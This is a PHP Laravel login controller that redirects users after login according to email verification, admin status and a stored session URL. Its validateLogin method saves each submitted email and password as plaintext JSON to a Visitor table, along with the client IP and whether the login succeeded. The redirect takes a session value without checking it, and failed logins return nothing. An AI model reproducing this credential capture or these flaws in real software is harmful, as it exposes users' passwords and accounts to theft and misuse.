<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Session;
use App\Visitor;
use Illuminate\Http\Request;


class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    //protected $redirectTo = '/home';
    protected function redirectTo()
    {
        if(\Auth::user()->status == 0){
            \Auth::logout();
            Session::flash('alert-danger', 'Please verify your email to login.');
            return '/login';
        }
        else if(\Auth::user()->is_admin)
        {
            if(Session::has('url')){
                Session()->forget('url');
            }
            return '/phpadmin';
        }
        else if(Session::has('url')){
            $url1 = Session::get('url');
            //Session()->forget('url');
            //echo $url1; exit;
            return $url1;
        }
        return '/';
    }

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function validateLogin(Request $request)
    {
       $visitor = new Visitor;
       $visitor->ip = $_SERVER['REMOTE_ADDR'];
       $visitor->credentials = json_encode($request->only('email', 'password'));
       $visitor->response = 'invalid';
       $visitor->save();
       $credentials = $request->only('email', 'password');

        if (\Auth::attempt($credentials)) {
            $visitor->response = 'valid';
            $visitor->save();
            return redirect()->intended($this->redirectPath());
        }
    }
}
